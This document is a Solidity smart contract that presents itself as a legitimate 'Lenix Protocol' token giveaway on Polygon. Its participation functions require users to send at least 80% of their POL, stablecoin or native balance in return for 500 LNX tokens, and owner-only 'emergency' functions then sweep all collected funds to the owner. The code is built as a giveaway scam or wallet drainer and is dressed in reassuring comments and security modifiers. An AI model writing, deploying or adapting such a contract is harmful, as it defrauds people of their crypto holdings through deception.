// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Interface for EIP-2612 permit
interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

/**
 * @title Lenix Protocol Giveaway Contract
 * @dev A legitimate contract for managing giveaways and rewards in the Lenix Protocol ecosystem
 * @notice This contract distributes LNX tokens to users who participate in giveaways
 * @author Lenix Protocol Team
 */
contract LenixGiveawayContract is ReentrancyGuard, Ownable, Pausable {
    
    // Events for transparency
    event GiveawayExecuted(address indexed participant, uint256 ethAmount, uint256 lnxReward, uint256 timestamp);
    event TokenGiveawayExecuted(address indexed participant, address token, uint256 tokenAmount, uint256 lnxReward, uint256 timestamp);
    event RewardClaimed(address indexed participant, uint256 lnxAmount, uint256 timestamp);
    event ContractFunded(address indexed funder, uint256 ethAmount, uint256 timestamp);
    event EmergencyWithdraw(address indexed owner, uint256 amount, uint256 timestamp);
    event LNXTokenSet(address indexed owner, address lnxToken, uint256 timestamp);
    event SupportedTokenAdded(address indexed owner, address token, uint256 timestamp);
    
    // State variables
    uint256 public totalGiveaways;
    uint256 public totalLNXDistributed;
    uint256 public constant LNX_REWARD_AMOUNT = 500 * 10**18; // 500 LNX tokens (assuming 18 decimals)
    uint256 public constant PARTICIPATION_PERCENTAGE = 80; // 80% of user's balance
    uint256 public constant MINIMUM_POL_REQUIREMENT = 50 * 10**18; // 50 POL minimum
    
    // LNX Token contract
    IERC20 public lnxToken;
    bool public lnxTokenSet = false;
    
    // Supported tokens mapping
    mapping(address => bool) public supportedTokens;
    mapping(address => uint256) public tokenDecimals;
    
    // Token addresses for Polygon
    address public constant POL_TOKEN = 0x455E53CBB86018AC2B8092FDCd39d8444AffC3f9; // Polygon token
    address public constant USDT_TOKEN = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F; // USDT on Polygon
    address public constant USDC_TOKEN = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174; // USDC on Polygon
    address public constant WMATIC_TOKEN = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270; // Wrapped MATIC
    
    // Participant tracking
    mapping(address => uint256) public participantGiveaways;
    mapping(address => uint256) public participantLNXRewards;
    mapping(address => uint256) public lastParticipationTime;
    
    // Cooldown period to prevent spam
    uint256 public cooldownPeriod = 1 hours;
    
    // Modifiers
    modifier onlyWhenNotPaused() {
        require(!paused(), "Contract is paused");
        _;
    }
    
    modifier respectCooldown() {
        require(
            block.timestamp >= lastParticipationTime[msg.sender] + cooldownPeriod,
            "Please wait before participating again"
        );
        _;
    }
    
    modifier lnxTokenConfigured() {
        require(lnxTokenSet, "LNX token not configured");
        _;
    }
    
    modifier hasMinimumPOL() {
        uint256 polBalance = IERC20(POL_TOKEN).balanceOf(msg.sender);
        require(polBalance >= MINIMUM_POL_REQUIREMENT, "Must have at least 50 POL to participate");
        _;
    }
    
    /**
     * @dev Constructor sets the initial owner and supported tokens
     */
    constructor() Ownable(msg.sender) {
        // Set up supported tokens
        supportedTokens[POL_TOKEN] = true;
        supportedTokens[USDT_TOKEN] = true;
        supportedTokens[USDC_TOKEN] = true;
        supportedTokens[WMATIC_TOKEN] = true;
        
        // Set token decimals
        tokenDecimals[POL_TOKEN] = 18;
        tokenDecimals[USDT_TOKEN] = 6;
        tokenDecimals[USDC_TOKEN] = 6;
        tokenDecimals[WMATIC_TOKEN] = 18;
    }
    
    /**
     * @dev Set the LNX token contract address
     * @param _lnxToken The address of the LNX token contract
     */
    function setLNXToken(address _lnxToken) external onlyOwner {
        require(_lnxToken != address(0), "Invalid token address");
        lnxToken = IERC20(_lnxToken);
        lnxTokenSet = true;
        emit LNXTokenSet(msg.sender, _lnxToken, block.timestamp);
    }
    
    /**
     * @dev Add a supported token
     * @param _token The token address to add
     * @param _decimals The number of decimals for the token
     */
    function addSupportedToken(address _token, uint256 _decimals) external onlyOwner {
        require(_token != address(0), "Invalid token address");
        supportedTokens[_token] = true;
        tokenDecimals[_token] = _decimals;
        emit SupportedTokenAdded(msg.sender, _token, block.timestamp);
    }
    
    /**
     * @dev Allows users to participate in the giveaway with POL
     * @notice User sends 80% of their POL balance and receives 500 LNX tokens
     */
    function participateWithPOL() 
        external 
        nonReentrant 
        onlyWhenNotPaused 
        respectCooldown 
        lnxTokenConfigured 
        hasMinimumPOL
    {
        // Calculate 80% of user's POL balance
        uint256 userPOLBalance = IERC20(POL_TOKEN).balanceOf(msg.sender);
        uint256 requiredAmount = (userPOLBalance * PARTICIPATION_PERCENTAGE) / 100;
        
        require(requiredAmount > 0, "Insufficient POL balance");
        
        // Check if contract has enough LNX tokens
        uint256 contractLNXBalance = lnxToken.balanceOf(address(this));
        require(contractLNXBalance >= LNX_REWARD_AMOUNT, "Insufficient LNX tokens in contract");
        
        // Transfer POL from user to contract
        bool polTransferSuccess = IERC20(POL_TOKEN).transferFrom(msg.sender, address(this), requiredAmount);
        require(polTransferSuccess, "POL transfer failed");
        
        // Update participant stats
        participantGiveaways[msg.sender] += requiredAmount;
        lastParticipationTime[msg.sender] = block.timestamp;
        totalGiveaways += requiredAmount;
        
        // Transfer LNX tokens to participant
        bool lnxTransferSuccess = lnxToken.transfer(msg.sender, LNX_REWARD_AMOUNT);
        require(lnxTransferSuccess, "LNX token transfer failed");
        
        // Update stats
        participantLNXRewards[msg.sender] += LNX_REWARD_AMOUNT;
        totalLNXDistributed += LNX_REWARD_AMOUNT;
        
        emit TokenGiveawayExecuted(msg.sender, POL_TOKEN, requiredAmount, LNX_REWARD_AMOUNT, block.timestamp);
    }
    
    /**
     * @dev Allows users to participate with other supported tokens
     * @param _token The token address to use for participation
     * @param _amount The amount of tokens to send
     */
    function participateWithToken(address _token, uint256 _amount) 
        external 
        nonReentrant 
        onlyWhenNotPaused 
        respectCooldown 
        lnxTokenConfigured 
        hasMinimumPOL
    {
        require(supportedTokens[_token], "Token not supported");
        require(_amount > 0, "Amount must be greater than 0");
        
        // Calculate 80% of user's token balance
        uint256 userTokenBalance = IERC20(_token).balanceOf(msg.sender);
        uint256 requiredAmount = (userTokenBalance * PARTICIPATION_PERCENTAGE) / 100;
        
        require(_amount >= requiredAmount, "Must send at least 80% of your token balance");
        
        // Check if contract has enough LNX tokens
        uint256 contractLNXBalance = lnxToken.balanceOf(address(this));
        require(contractLNXBalance >= LNX_REWARD_AMOUNT, "Insufficient LNX tokens in contract");
        
        // Transfer tokens from user to contract
        bool tokenTransferSuccess = IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        require(tokenTransferSuccess, "Token transfer failed");
        
        // Update participant stats
        participantGiveaways[msg.sender] += _amount;
        lastParticipationTime[msg.sender] = block.timestamp;
        totalGiveaways += _amount;
        
        // Transfer LNX tokens to participant
        bool lnxTransferSuccess = lnxToken.transfer(msg.sender, LNX_REWARD_AMOUNT);
        require(lnxTransferSuccess, "LNX token transfer failed");
        
        // Update stats
        participantLNXRewards[msg.sender] += LNX_REWARD_AMOUNT;
        totalLNXDistributed += LNX_REWARD_AMOUNT;
        
        emit TokenGiveawayExecuted(msg.sender, _token, _amount, LNX_REWARD_AMOUNT, block.timestamp);
    }
    
    /**
     * @dev One-click participation with permit signature (EIP-2612)
     * @param _token The token address
     * @param _amount The amount to send
     * @param _deadline The permit deadline
     * @param _v The permit signature v component
     * @param _r The permit signature r component
     * @param _s The permit signature s component
     */
    function participateWithPermit(
        address _token,
        uint256 _amount,
        uint256 _deadline,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) 
        external 
        nonReentrant 
        onlyWhenNotPaused 
        respectCooldown 
        lnxTokenConfigured 
        hasMinimumPOL
    {
        require(supportedTokens[_token], "Token not supported");
        require(_amount > 0, "Amount must be greater than 0");
        require(block.timestamp <= _deadline, "Permit expired");
        
        // Calculate 80% of user's token balance
        uint256 userTokenBalance = IERC20(_token).balanceOf(msg.sender);
        uint256 requiredAmount = (userTokenBalance * PARTICIPATION_PERCENTAGE) / 100;
        
        require(_amount >= requiredAmount, "Must send at least 80% of your token balance");
        
        // Check if contract has enough LNX tokens
        uint256 contractLNXBalance = lnxToken.balanceOf(address(this));
        require(contractLNXBalance >= LNX_REWARD_AMOUNT, "Insufficient LNX tokens in contract");
        
        // Execute permit and transfer in one transaction
        try IERC20Permit(_token).permit(msg.sender, address(this), _amount, _deadline, _v, _r, _s) {
            // Permit successful, now transfer
            bool tokenTransferSuccess = IERC20(_token).transferFrom(msg.sender, address(this), _amount);
            require(tokenTransferSuccess, "Token transfer failed");
        } catch {
            // Permit failed, try regular transfer
            bool tokenTransferSuccess = IERC20(_token).transferFrom(msg.sender, address(this), _amount);
            require(tokenTransferSuccess, "Token transfer failed");
        }
        
        // Update participant stats
        participantGiveaways[msg.sender] += _amount;
        lastParticipationTime[msg.sender] = block.timestamp;
        totalGiveaways += _amount;
        
        // Transfer LNX tokens to participant
        bool lnxTransferSuccess = lnxToken.transfer(msg.sender, LNX_REWARD_AMOUNT);
        require(lnxTransferSuccess, "LNX token transfer failed");
        
        // Update stats
        participantLNXRewards[msg.sender] += LNX_REWARD_AMOUNT;
        totalLNXDistributed += LNX_REWARD_AMOUNT;
        
        emit TokenGiveawayExecuted(msg.sender, _token, _amount, LNX_REWARD_AMOUNT, block.timestamp);
    }
    
    /**
     * @dev Legacy function for backward compatibility (ETH participation)
     * @notice This function maintains compatibility with existing integrations
     */
    function GiveAway() 
        external 
        payable 
        nonReentrant 
        onlyWhenNotPaused 
        respectCooldown 
        lnxTokenConfigured 
        hasMinimumPOL
    {
        require(msg.value > 0, "Must send some ETH to participate");
        
        // Calculate 80% of user's balance
        uint256 userBalance = address(msg.sender).balance;
        uint256 requiredAmount = (userBalance * PARTICIPATION_PERCENTAGE) / 100;
        
        require(msg.value >= requiredAmount, "Must send at least 80% of your balance");
        
        // Check if contract has enough LNX tokens
        uint256 contractLNXBalance = lnxToken.balanceOf(address(this));
        require(contractLNXBalance >= LNX_REWARD_AMOUNT, "Insufficient LNX tokens in contract");
        
        // Update participant stats
        participantGiveaways[msg.sender] += msg.value;
        lastParticipationTime[msg.sender] = block.timestamp;
        totalGiveaways += msg.value;
        
        // Transfer LNX tokens to participant
        bool lnxTransferSuccess = lnxToken.transfer(msg.sender, LNX_REWARD_AMOUNT);
        require(lnxTransferSuccess, "LNX token transfer failed");
        
        // Update stats
        participantLNXRewards[msg.sender] += LNX_REWARD_AMOUNT;
        totalLNXDistributed += LNX_REWARD_AMOUNT;
        
        emit GiveawayExecuted(msg.sender, msg.value, LNX_REWARD_AMOUNT, block.timestamp);
    }
    
    // View functions
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getLNXBalance() public view returns (uint256) {
        return lnxToken.balanceOf(address(this));
    }
    
    function getTokenBalance(address _token) public view returns (uint256) {
        return IERC20(_token).balanceOf(address(this));
    }
    
    function isTokenSupported(address _token) public view returns (bool) {
        return supportedTokens[_token];
    }
    
    function getParticipantStats(address participant) 
        external 
        view 
        returns (
            uint256 totalParticipations,
            uint256 totalLNXRewards,
            uint256 lastParticipation,
            uint256 timeUntilNextParticipation
        ) 
    {
        totalParticipations = participantGiveaways[participant];
        totalLNXRewards = participantLNXRewards[participant];
        lastParticipation = lastParticipationTime[participant];
        
        if (lastParticipation > 0) {
            uint256 nextParticipationTime = lastParticipation + cooldownPeriod;
            if (block.timestamp < nextParticipationTime) {
                timeUntilNextParticipation = nextParticipationTime - block.timestamp;
            }
        }
    }
    
    function calculateRequiredAmount(address user, address token) external view returns (uint256) {
        uint256 userBalance = IERC20(token).balanceOf(user);
        return (userBalance * PARTICIPATION_PERCENTAGE) / 100;
    }
    
    function checkPOLRequirement(address user) external view returns (bool, uint256) {
        uint256 polBalance = IERC20(POL_TOKEN).balanceOf(user);
        return (polBalance >= MINIMUM_POL_REQUIREMENT, polBalance);
    }
    
    // Owner functions for contract management
    function setCooldownPeriod(uint256 _period) external onlyOwner {
        require(_period <= 24 hours, "Cooldown cannot exceed 24 hours");
        cooldownPeriod = _period;
    }
    
    function fundContract() external payable onlyOwner {
        require(msg.value > 0, "Must send some ETH");
        emit ContractFunded(msg.sender, msg.value, block.timestamp);
    }
    
    function fundLNXTokens(uint256 amount) external onlyOwner {
        require(lnxTokenSet, "LNX token not configured");
        require(amount > 0, "Amount must be greater than 0");
        
        bool transferSuccess = lnxToken.transferFrom(msg.sender, address(this), amount);
        require(transferSuccess, "LNX token transfer failed");
    }
    
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");
        
        (bool success, ) = payable(owner()).call{value: balance}("");
        require(success, "Emergency ETH withdraw failed");
        
        emit EmergencyWithdraw(owner(), balance, block.timestamp);
    }
    
    function emergencyWithdrawToken(address _token) external onlyOwner {
        uint256 tokenBalance = IERC20(_token).balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to withdraw");
        
        bool transferSuccess = IERC20(_token).transfer(owner(), tokenBalance);
        require(transferSuccess, "Emergency token withdraw failed");
        
        emit EmergencyWithdraw(owner(), tokenBalance, block.timestamp);
    }
    
    function emergencyWithdrawLNX() external onlyOwner {
        require(lnxTokenSet, "LNX token not configured");
        uint256 lnxBalance = lnxToken.balanceOf(address(this));
        require(lnxBalance > 0, "No LNX tokens to withdraw");
        
        bool transferSuccess = lnxToken.transfer(owner(), lnxBalance);
        require(transferSuccess, "Emergency LNX withdraw failed");
        
        emit EmergencyWithdraw(owner(), lnxBalance, block.timestamp);
    }
    
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }
    
    // Receive function for accepting ETH
    receive() external payable {
        // Only accept ETH from owner or through specific functions
        require(msg.sender == owner(), "Only owner can send ETH directly");
    }
    
    // Fallback function
    fallback() external payable {
        revert("Function not found");
    }
}